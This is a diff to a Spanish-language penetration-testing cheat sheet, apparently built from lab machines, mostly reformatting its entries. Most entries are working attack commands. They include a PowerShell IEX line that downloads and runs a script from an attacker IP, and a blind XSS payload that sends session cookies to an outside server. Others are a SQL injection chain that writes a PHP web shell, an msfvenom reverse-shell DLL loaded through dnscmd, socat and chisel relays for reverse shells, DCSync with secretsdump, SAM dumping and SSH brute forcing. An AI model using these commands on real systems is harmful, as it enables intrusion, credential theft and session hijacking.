@@ -76,6 +76,12 @@ Herramienta: "iwr"
 Descripcion: Descargar un documento de otra computadora
 Comando: iwr http://10.10.14.65:8000/winPEAS.exe -outf .\winPEAS.exe / IEX(New-Object Net.WebClient).downloadString('http://10.10.14.65/PowerView.ps1')
 ------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Transferencia de archivos"
+Protocolo: "Comandos"
+Herramienta: "iex"
+Descripcion: Descargar un documento de otra computadora
+Comando: IEX(New-Object Net.WebClient).downloadString('http://10.10.14.65/PowerView.ps1')
+------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Windows"
 Protocolo: "Comandos"
 Herramienta: "Get-ADDomain"
@@ -140,7 +146,7 @@ Categoria: "Web"
 Protocolo: "Python"
 Herramienta: "Python"
 Descripcion: Levantar un servidor temporal
-Comando: python -m SimpleHTTPServer 1818 / python -m http.server 1234
+Comando: python -m SimpleHTTPServer 1818 
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Linux"
 Protocolo: "Comandos"
@@ -318,12 +324,6 @@ Comando: xxd -ps -r
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Descompresion de archivos"
 Protocolo: "Comandos"
-Herramienta: "7z"
-Descripcion: Descompresor universal
-Comando: 7z
-------------------------------------------------------------------------------------------------------------------------------------
-Categoria: "Descompresion de archivos"
-Protocolo: "Comandos"
 Herramienta: "7z"   
 Descripcion: Descompresor universal - Listar el contenido del archivo
 Comando: 7z l        
@@ -344,7 +344,7 @@ Categoria: "Descompresion de archivos"
 Protocolo: "Comandos"
 Herramienta: "tar"
 Descripcion: Descomprimir archivos .tgz
-Comando: tar -xvzf archivto.tgz
+Comando: tar -xvzf archivo.tgz
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Descompresion de archivos"
 Protocolo: "Comandos"
@@ -449,11 +449,7 @@ Categoria: "Scan"
 Protocolo: "TCP"
 Herramienta: "nmap"
 Descripcion: Script para escanear multiples IP
-Comando: 
-#!/bin/bash
-while read line 
-do
-	nmap -Pn -sS -p- -n --reason -vvv $line -oA TCP_SCAN_NF_$line
+Comando: #!/bin/bash \nwhile read line\n do\n nmap -Pn -sS -p- -n --reason -vvv $line -oA TCP_SCAN_NF_$line
 done < infra_externa.txt
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Scan"
@@ -494,9 +490,7 @@ Categoria: "Active Directory"
 Protocolo: "SMB"
 Herramienta: "smbcacls"
 Descripcion: Listar los permisos de un recurso con smbcalcs 
-Comando:
-tput civis; for directory in $(ls); do echo -e "\n[+] Enumerando permisos en el directorio $directory:\n"; echo -e "\t$(smbcacls "//10.129.30.127/Department Shares" Users/$directory -N | grep "Everyone")"; done; tput cnorm
-
+Comando: \n tput civis; for directory in $(ls); do echo -e "\n[+] Enumerando permisos en el directorio $directory:\n"; echo -e "\t$(smbcacls "//10.129.30.127/Department Shares" Users/$directory -N | grep "Everyone")"; done; tput cnorm
 for file in $(ls); do echo $file; done | grep -v -i "^ntuser" | while read line; do echo -e "\n[*] $line:\n"; smbcacls //10.10.10.40/Users Default/$line -N | grep -i "everyone"; done 
 smbcacls //10.10.10.10/Recurso_Compartido dominio -U 'usuario%contraseña'
 Ejemplo: smbcacls //10.10.10.100/Replication active.htb -U 'SVC_TGS%GPPstillStandingStrong2k18'
@@ -528,7 +522,7 @@ Categoria: "Active Directory"
 Protocolo: "SMB"
 Herramienta: "smbclient"
 Descripcion: Listar recurso compartidos con smbclient recursivamente
-Comando: UNa vez conectados al recurso compartido mediante smbclient ejecutar:
+Comando: Una vez conectados al recurso compartido mediante smbclient ejecutar:
 1. recurse ON
 2. prompt OFF 
 3. mget * 
@@ -537,10 +531,14 @@ Categoria: "Active Directory"
 Protocolo: "SMB"
 Herramienta: "smbmap"
 Descripcion: Listar de forma recursiva todos los recursos que estan bajo el dominio que especifiquemos   
-Comando: 
-smbmap -d dominio -H 10.10.10.100 -r recurso_compartido 
-ejemplo: smbmap -d active.htb -H 10.10.10.100 -r Repli 
+Comando: smbmap -d dominio -H 10.10.10.100 -r recurso_compartido
 smbmap -d active.htb -H 10.10.10.100 -r Replication -A Group.xml -q -> Buscar de forma recursiva pero descargar el archivo Group.xml cuando lo encuentre 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbmap"
+Descripcion: Buscar de forma recursiva pero descargar el archivo Group.xml cuando lo enucuentre
+Comando: smbmap -d active.htb -H 10.10.10.100 -r Replication -A Group.xml -q 
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "SMB"
@@ -595,14 +593,6 @@ Herramienta: "crackmapexec"
 Descripcion: Validar contraseñas con crackmapexec
 Comando: crackmapexec smb 10.10.10.169 -u 'user' -p 'password'
 NOTA: Siempre que encuentra credenciales validarlas con crackmapexec para ver si corresponde a un usuario
-------------------------------------------------------------------------------------------------------------------------------------
-Categoria: "Active Directory"
-Protocolo: "Password spry" 
-Herramienta: "crackmapexec"
-Descripcion: Password spry
-Comando: crackmapexec smb 10.10.10.0/24 -u ‘<user>’ -p ‘<password>’ -> Cuando tienes credenciales y ver si puedes logearte en otro equipo de la red con esas mismas credenciales.
-NOTA: Siempre que encuentra credenciales validarlas con crackmapexec para ver si corresponde a un usuario
-crackmapexec smb 10.10.10.169 -u ‘users.out’ -p ‘password123!’ -> Cuando quieres ver si una contraseña es valida para algun otro usuario o puede ser en viceversa.
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Transferencia de archivos"
 Protocolo: "SMB"
@@ -676,10 +666,10 @@ Comando: git clone https://github.com/s4vitar/eviltrust
 Categoria: "github"
 Protocolo: "github"
 Herramienta: "git" 
-Descripcion: Ver los commits de un proyecto
+Descripcion: Ver los commits de un proyecto (Debes estar parado en la carpeta donde teines el repo)
 Comando: 
-git log (Debes estar parado en la carpeta donde teines el repo)
-git show <commit>
+1 git log
+2 git show <commit>
 Categoria: github
 Protocolo: github
 Herramienta: git 
@@ -701,8 +691,8 @@ Protocolo: "github"
 Herramienta: "git"
 Descripcion: Ver las etiquetas de un proyecto
 Comando: 
-git tag 
-git show <tag_name>
+1 git tag 
+2 git show <tag_name>
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "github"
 Protocolo: "github"
@@ -724,12 +714,12 @@ Comando: git push <rama_name>
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Tomcat"
 Protocolo: "Tomcat"
-Herramienta: "Tomcat"
+Herramienta: "tomcat"
 Descripcion: Enumeracion de Tomcat
 Comando:
-\##### Panel de administracion de Tomcat \#####
+1 Panel de administracion de Tomcat
 /manager/html
-\##### Credenciales por defecto\#####
+2 Credenciales por defecto
  tomcat:s3cret
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Tomcat"
@@ -743,13 +733,13 @@ Protocolo: "Comandos"
 Herramienta: "tty"
 Descripcion: Tratamiento de la TTY
 Comando: 
-1. script /dev/null -c bash / python3 -c 'import pty;pty.spawn("/bin/sh")'
-2. CTRL + Z
-3. stty raw -echo; fg
-4. reset / reset xterm
-5. export TERM=xterm
-6. export SHELL=bash
-7. stty rows 40 columns 123
+1 script /dev/null -c bash / python3 -c 'import pty;pty.spawn("/bin/sh")'
+2 CTRL + Z
+3 stty raw -echo; fg
+4 reset / reset xterm
+5 export TERM=xterm
+6 export SHELL=bash
+7 stty rows 40 columns 123
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "WordPress"
 Protocolo: "WordPress"
@@ -774,11 +764,11 @@ Protocolo: "TCP"
 Herramienta: "chisel"
 Descripcion: Tuneling con chisel y proxychains
 Comando: 
-1) ./chisel server --reverse -p 1233 - Colocar chisel en modo servidor (En mi host)
-2) Configurar el archivo /etc/proxychains4.conf agregando:
+1 ./chisel server --reverse -p 1233 - Colocar chisel en modo servidor (En mi host)
+2 Configurar el archivo /etc/proxychains4.conf agregando:
 socks5 127.0.0.1 1080
-3) ./chisel client 10.10.14.12:1233 R:socks - Conectar el cliente al servidor (En la victima)
-4) Ejecutar cuaqluier comando a la victima ingresando antes proxychains
+3 ./chisel client 10.10.14.12:1233 R:socks - Conectar el cliente al servidor (En la victima)
+4 Ejecutar cuaqluier comando a la victima ingresando antes proxychains
 NOTA: Esto funsiona cuando queremos traer varios puertos al mismo tiempo y no uno por uno
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Pivoting"
@@ -786,12 +776,12 @@ Protocolo: "TCP"
 Herramienta: "chisel"
 Descripcion: Doble Tuneling con chisel y proxychains
 Comando:
-1) ./chisel client 10.10.0.128:2232 R:8888:socks (En la maquina victima, colocarlo a la interfaz mas cercana)
-2) ./socat TCP-LISTEN:2232,fork TCP:192.168.27.128:1233 (En la maquina mas cercana, la maquina puente redirigir el trafico que le llegue por el puerto 2232 al puerto 1233 que es mi servidor de chisel en mi maquina de atacante)
-3) Configurar el archivo /etc/proxychains4.conf agregando:
-- Descomentar dynamic_chain y comentar strict_chain
-- socks5 127.0.0.1 8888 (Agregar la linea arriba del primer tunel)
-4) Ejecutar cuaqluier comando hacia la victima ingresando antes proxychains
+1 ./chisel client 10.10.0.128:2232 R:8888:socks (En la maquina victima, colocarlo a la interfaz mas cercana)
+2 ./socat TCP-LISTEN:2232,fork TCP:192.168.27.128:1233 (En la maquina mas cercana, la maquina puente redirigir el trafico que le llegue por el puerto 2232 al puerto 1233 que es mi servidor de chisel en mi maquina de atacante)
+3 Configurar el archivo /etc/proxychains4.conf agregando:
+4 Descomentar dynamic_chain y comentar strict_chain
+5 socks5 127.0.0.1 8888 (Agregar la linea arriba del primer tunel)
+6 Ejecutar cuaqluier comando hacia la victima ingresando antes proxychains
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "SMB"
 Protocolo: "SMB"
@@ -813,11 +803,11 @@ Comando:  put file.txt
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Comandos"
 Protocolo: "Windows"
-Herramienta: "RunaCS"
+Herramienta: "runa"
 Descripcion: Cambiarte de usuario en windows
 Comando:  
-Cuando dispones de credenciales de otro usuario y no hay agun servicio como ssh,winrm,etc. Usar RunasCs.exe
-RunasCs.exe <usuario> <password> powershell -r 10.10.14.12:5555
+1 Cuando dispones de credenciales de otro usuario y no hay agun servicio como ssh,winrm,etc. Usar RunasCs.exe
+2 RunasCs.exe <usuario> <password> powershell -r 10.10.14.12:5555
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Comandos"
 Protocolo: "Windows"
@@ -854,7 +844,8 @@ Categoria: "Recon"
 Protocolo: "DNS"
 Herramienta: "comandos"
 Descripcion: Enumeracion de subdominios localmente (Util cuando comprometiste una maquina y quieres ver is existen mas subdominios en ella
-Comando: cat /etc/hosts / Cuando se trate de servidores nginx Revisar (ls) la ruta: /etc/nginx/sites-enabled 
+Comando: cat /etc/hosts 
+Nota: Cuando se trate de servidores nginx Revisar (ls) la ruta: /etc/nginx/sites-enabled 
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "SQLI"
 Protocolo: "SQL"
@@ -898,25 +889,23 @@ Categoria: "AV"
 Protocolo: "Comandos"
 Herramienta: "nessus"
 Descripcion: Inicializar nessus
-Comando: 
-1.Ejeuctar: /sbin/service nessusd start
-2.Entrar a https://127.0.0.1:8834
+Comando: /sbin/service nessusd start
+NOTA: Entrar a https://127.0.0.1:8834
 ---------------------------------------------------------------------------------------------------------------------------
 Categoria: "Pivoting"
 Protocolo: "TCP"
 Herramienta: "socat"
 Descripcion: Redirigir trafico por puertos (util para rev shell en pivoting) 
-Comando:
-./socat TCP-LISTEN:4545,fork tcp:10.10.14.9:5555 &
+Comando: ./socat TCP-LISTEN:4545,fork tcp:10.10.14.9:5555 &
 ---------------------------------------------------------------------------------------------------------------------------
 Categoria: "Privilege Escalation"
 Protocolo: "Comandos"
 Herramienta: "cron"
 Descripcion: Buscar tareas cron
 Comando:
-1. cat /etc/crontab
-2. ls /var/spool/cron/crontabs
-3. ls /etc/cron.d
+1 cat /etc/crontab
+2 ls /var/spool/cron/crontabs
+3 ls /etc/cron.d
 ---------------------------------------------------------------------------------------------------------------------------
 Categoria: "Transferencia de archivos"
 Protocolo: "TCP"
@@ -958,15 +947,14 @@ Categoria: "Privilege Escalation"
 Protocolo: "TCP"
 Herramienta: "netstat"
 Descripcion: Revisar los puertos abiertos internamente
-Comando: 
-netstat -nat 
-ss -nltp
+Comando: netstat -nat 
+Comando: ss -nltp
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Pivoting"
 Protocolo: "TCP"
 Herramienta: "proxychains"
 Descripcion: Local Port Forwarding con proxychains y chisel
-Comando:proxychains ssh user@10.10.0.128 -L 8080:127.0.0.1:8080
+Comando: proxychains ssh user@10.10.0.128 -L 8080:127.0.0.1:8080
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Windows"
 Protocolo: "Comandos"
@@ -1021,27 +1009,27 @@ Categoria: "Pentesting Web"
 Vulnerabilidad: "SQLi"
 Descripcion: Inyeccion SQL basada en error
 Comando: 
-1. Deteccion -> Ingresar en un input o url una ' si se recibe un error de sintaxis SQL es vulnerable
-2. Colocar un ordenamiento ingresando muchas columas -> order by 100-- - (Probarlo sin comilla antes y con comilla)
-3. Para saber el numero de columnas exacto de la BD empezar a jugar con los numeros es decir ingresar order by 1-- - , order by 2-- - ... hasta que no se muestre el error Unknow columns 
-4. Una vez que se concocen las columnas exactas de la BD aplicar una seleccion -> union select 1,2,3,4,5-- -
-5. Saber el nombre de la BD en uso -> union select 1,database(),3,4,5-- - 
-6. Saber el nombre dle usuario usando la BD -> union select 1,user(),3,4,5-- -
-7. Saber la version del DBMS de la BD -> union select 1,version(),3,4,5-- -
-8. Cargar archivos de la maquina local -> union select 1,load_file('/etc/passwd'),3,4,5-- -
-9.Conocer otras BDs que la maquina aloje -> union select 1,schema_name,3,4,5 from information_schema.schemata-- -
+1 Deteccion -> Ingresar en un input o url una ' si se recibe un error de sintaxis SQL es vulnerable
+2 Colocar un ordenamiento ingresando muchas columas -> order by 100-- - (Probarlo sin comilla antes y con comilla)
+3 Para saber el numero de columnas exacto de la BD empezar a jugar con los numeros es decir ingresar order by 1-- - , order by 2-- - ... hasta que no se muestre el error Unknow columns 
+4 Una vez que se concocen las columnas exactas de la BD aplicar una seleccion -> union select 1,2,3,4,5-- -
+5 Saber el nombre de la BD en uso -> union select 1,database(),3,4,5-- - 
+6 Saber el nombre dle usuario usando la BD -> union select 1,user(),3,4,5-- -
+7 Saber la version del DBMS de la BD -> union select 1,version(),3,4,5-- -
+8 Cargar archivos de la maquina local -> union select 1,load_file('/etc/passwd'),3,4,5-- -
+9 Conocer otras BDs que la maquina aloje -> union select 1,schema_name,3,4,5 from information_schema.schemata-- -
 NOTA: En caso de no mostrarlas por este metodo, jugar con limit
 union select 1,schema_name,3,4,5 from information_schema.schemata limit 1,1-- -
 union select 1,schema_name,3,4,5 from information_schema.schemata limit 2,1-- -
-10. Enumerar las tablas de una BD -> union select 1,table_name,3,4,5 from information_schema.tables where table_schema = "nombre_bd"-- -
+10 Enumerar las tablas de una BD -> union select 1,table_name,3,4,5 from information_schema.tables where table_schema = "nombre_bd"-- -
 NOTA: En caso de que no muestre nada pasar el nombre de la BD  a hexadecimal -> echo "Secret" | xxd -ps (Copiar los valores omitiendo el 0a)
 union select 1,table_name,3,4,5 from information_schema.tables where table_schema = 0x536563726574-- - 
 NOTA: Colocar un 0x antes del valor en hexadecimal
-11. Listar las columnas de una tabla de una BD -> union select 1,column_name,3,4,5 from information_schema.columns where table_schema = 0x536563726574 and table_name = 0x5573657273-- -
+11 Listar las columnas de una tabla de una BD -> union select 1,column_name,3,4,5 from information_schema.columns where table_schema = 0x536563726574 and table_name = 0x5573657273-- -
 NOTA: El nombre de la tabla tambien va en headecimal repiteiendo el mismo procedimiento previo
-12.Dumpear las columnas de una tabla de una BD ->  union select 1,concat(Username,0x3a,Password),3,4,5 from Secret.Users-- -
+12 Dumpear las columnas de una tabla de una BD ->  union select 1,concat(Username,0x3a,Password),3,4,5 from Secret.Users-- -
 NOTA: Se agregan 0x3a ya que representa dos puntos para que las represente como user:pass
-13. Depositar contenido en una ruta -> ' union select "probando" into outfile "/var/www/html/prueba.txt"-- -
+13 Depositar contenido en una ruta -> ' union select "probando" into outfile "/var/www/html/prueba.txt"-- -
 ' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php"-- -
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Pentesting Web"
@@ -1054,14 +1042,14 @@ Categoria: "Pentesting Web"
 Vulnerabilidad: "Reflected XSS"
 Descripcion: Reflected Cross-Site Scripting XSS
 Comando: <script>alert("Probando XSS")</script> 
-1. <script>alert(document.cookie)</script> Listar el contenido de mi cookie (Se necesita estar autenticado)
+Comando: <script>alert(document.cookie)</script> 
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Pentesting Web"
 Vulnerabilidad: "Blind XSS"
 Descripcion: Blind Cross-Site Scripting XSS
 Comando: La idea es enviar la cookie de sesion del usuario a un servidor tercero  
-1. python3 -m http.server 80 -> Colocar un servidor temporal 
-2. <script>document.write('<img src="http://10.10.14.5/srp3rr1n.jpg?cookie=' + document.cookie +'">')</script> ->Enviar la cookie de sesion de los usuarios autenticados a un servidor tercero
+1 python3 -m http.server 80 -> Colocar un servidor temporal 
+2 <script>document.write('<img src="http://10.10.14.5/srp3rr1n.jpg?cookie=' + document.cookie +'">')</script> ->Enviar la cookie de sesion de los usuarios autenticados a un servidor tercero
  <script>document.location="http://10.10.14.5/?cookie=" + document.cookie</script>
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Pentesting Web"
@@ -1182,8 +1170,7 @@ Categoria: "Pivoting"
 Protocolo: "SSH"
 Herramienta: "scp"
 Descripcion: Transferencia de archivos mediante scp en tunneling
-Comando: 
-1. proxychains scp file root@10.10.0.129:/tmp/chisel
+Comando:  proxychains scp file root@10.10.0.129:/tmp/chisel
 NOTA: Se requiere haber generado un par de llaves e ingresar la llave publica en .ssh/authorized_keys
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "comandos"
@@ -1197,23 +1184,22 @@ Protocolo: "TCP"
 Herramienta: "socat"
 Descripcion: Multiples redirecciones con socat
 Comando: Util cuando se necesite regresar una rev shell desde maquinas fuera de mi red (Siempre empezar a enviarlo al nodo mas cercano)
-1. ./socat TCP-LISTEN:5555,fork TCP:10.10.0.128:5556
-2. ./socat TCP-LISTEN:5556,fork TCP:192.168.27.128:443
+1 ./socat TCP-LISTEN:5555,fork TCP:10.10.0.128:5556
+2 ./socat TCP-LISTEN:5556,fork TCP:192.168.27.128:443
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Pivoting"
 Protocolo: "TCP"
 Herramienta: "ping"
 Descripcion: Enumerar equipos en otras redes con ping y arp en Windows
 Comando: 
-1. for /L %a in (1,1,254) do @start /b ping 172.18.0.%a -w 100 -n 2 >nul
-2. arp -a (En la seccion de la interfaz que enumeramos veremos nuevos euqipos descubiertos)
+1 for /L %a in (1,1,254) do @start /b ping 172.18.0.%a -w 100 -n 2 >nul
+2 arp -a (En la seccion de la interfaz que enumeramos veremos nuevos euqipos descubiertos)
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Brute Force"
 Protocolo: "ssh"
 Herramienta: "hydra"
 Descripcion: Ataque de fuerza bruta a ssh con hydra
-Comando: 
-hydra -l guest -P password.txt ssh://172.18.0.129 -t 20 2>/dev/null
+Comando: hydra -l guest -P password.txt ssh://172.18.0.129 -t 20 2>/dev/null
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "Kerberos"
@@ -1260,7 +1246,7 @@ NOTA: Cuando el usuario comprometido forma parte del grupo Account operators tie
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "windows"
-Herramienta: "impacket-secretsdump"
+Herramienta: "impacket-se"
 Descripcion: DCSync attack
 Comando: impacket-secretsdump -just-dc-ntlm <dominio>/SrP3rr1n:Admin123.@10.129.95.210
 Configuracion manual del ataque:
@@ -1334,13 +1320,12 @@ NOTA: Cuando se tenga un archivo lsass darle un file si el archivo es mini DUMP 
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "Windows"
-Herramienta: "reg save"
+Herramienta: "reg-save"
 Descripcion: Hacer una copia de los archivos system y sam
-Comando: 
-1. reg save HKLM\system system
-2. reg save HKLM\sam sam    
+Comando: reg save HKLM\system system
+Comando: reg save HKLM\sam sam    
 NOTA: Cuando se tenga el permiso SeBackupPrivilege puede hacerse un backup de cualquier archivo en este caso conviene hacerlo a los archivos system y sam para poder dumpear los hashesh d elos usuarios locales 
-NOTA2: Es mas importante dumpear el archivo ntds ya que extraera todos los hashes de los usuarios del dominio, el archivo comunmente se almacena en C:\Windows\NTDS por defecto no deja hacer el backup pero abusando del privilegio SeBackupPrivilege es posible primero debe crearse una unidad logica 
+NOTA: Es mas importante dumpear el archivo ntds ya que extraera todos los hashes de los usuarios del dominio, el archivo comunmente se almacena en C:\Windows\NTDS por defecto no deja hacer el backup pero abusando del privilegio SeBackupPrivilege es posible primero debe crearse una unidad logica 
 1. 
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
@@ -1372,7 +1357,7 @@ Protocolo: "DNS"
 Herramienta: "msfvenom"
 Descripcion: Crear una DLL maliciosa para manipular el servicio DNS al arrancarlo y obtener una SHELL (Se puede usar cuando el usuario forma parte del grupo DNSAdmins)
 Comando: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.194 LPORT=443 -f dll -o pwned2.dll
-Ejecucion: 
+NOTA: 
 1. impacket-smbserver smbFolder $(pwd) -smb2support
 2. dnscmd.exe /config /serverlevelplugindll \\10.10.14.194\smbFolder\pwned2.dll
 3. sc.exe stop dns
@@ -1449,7 +1434,6 @@ Protocolo: "SQL"
 Herramienta: "sqlite3"
 Descripcion: Enumerar tablas de una BD
 Comando: .tables
-
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Comandos"
 Protocolo: "Linux"
